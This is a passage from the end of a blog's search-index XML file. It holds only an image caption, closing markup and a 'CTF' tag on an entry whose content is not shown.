aria-hidden="true">image-20220809131535944</figcaption></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
